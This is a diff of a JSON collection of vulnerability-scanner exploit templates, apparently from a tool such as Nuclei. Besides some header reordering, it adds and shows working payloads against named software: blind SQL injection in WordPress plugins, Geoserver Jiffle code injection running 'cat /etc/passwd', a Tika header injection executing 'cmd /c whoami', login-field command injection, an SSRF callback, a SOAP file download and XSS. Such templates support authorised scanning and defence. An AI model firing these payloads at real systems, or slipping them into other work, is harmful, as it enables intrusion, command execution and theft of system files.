@@ -6816,11 +6816,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Content-type": "image/jp2",
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
-            "Expect": "100-continue"
+            "Expect": "100-continue",
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -10409,8 +10409,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "X-Atlassian-Token": "no-check",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "X-Atlassian-Token": "no-check"
           },
           "method": "POST",
           "path": [
@@ -11952,8 +11952,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -12428,9 +12428,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -15600,6 +15600,20 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
             "GET /wp-admin/admin.php?page=persian-wc&s=xxxxx%22+accesskey%3DX+onclick%3Dalert%281%29+test%3D%22 HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-24946",
+      "info": {
+        "name": "Modern Events Calendar < 6.1.5 - Blind SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nGET /wp-admin/admin-ajax.php?action=mec_load_single_page&time=1))%20UNION%20SELECT%20sleep(6)%20--%20g HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
@@ -20000,6 +20014,20 @@
       ]
     },
     {
+      "id": "CVE-2022-0784",
+      "info": {
+        "name": "Title Experiments Free < 9.0.1 - Unauthenticated SQLi",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "@timeout: 10s\nPOST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naction=wpex_titles&id[]=1 AND (SELECT 321 FROM (SELECT(SLEEP(6)))je)\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0785",
       "info": {
         "name": "WordPress Daily Prayer Time <2022.03.01 - SQL Injection",
@@ -21276,6 +21304,20 @@
         {
           "raw": [
             "POST /servlet/GetProductVersion HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-24816",
+      "info": {
+        "name": "Geoserver Server - Code Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /geoserver/wms HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n  <wps:Execute version=\"1.0.0\" service=\"WPS\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns=\"http://www.opengis.net/wps/1.0.0\" xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:wps=\"http://www.opengis.net/wps/1.0.0\" xmlns:ows=\"http://www.opengis.net/ows/1.1\" xmlns:gml=\"http://www.opengis.net/gml\" xmlns:ogc=\"http://www.opengis.net/ogc\" xmlns:wcs=\"http://www.opengis.net/wcs/1.1.1\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" xsi:schemaLocation=\"http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd\">\n    <ows:Identifier>ras:Jiffle</ows:Identifier>\n    <wps:DataInputs>\n      <wps:Input>\n        <ows:Identifier>coverage</ows:Identifier>\n        <wps:Data>\n          <wps:ComplexData mimeType=\"application/arcgrid\"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>script</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"cat /etc/passwd\").getInputStream())); String line = null; String allLines = \" - \"; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>outputType</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>DOUBLE</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n    </wps:DataInputs>\n    <wps:ResponseForm>\n      <wps:RawDataOutput mimeType=\"image/tiff\">\n        <ows:Identifier>result</ows:Identifier>\n      </wps:RawDataOutput>\n    </wps:ResponseForm>\n  </wps:Execute>\n"
           ]
         }
       ]
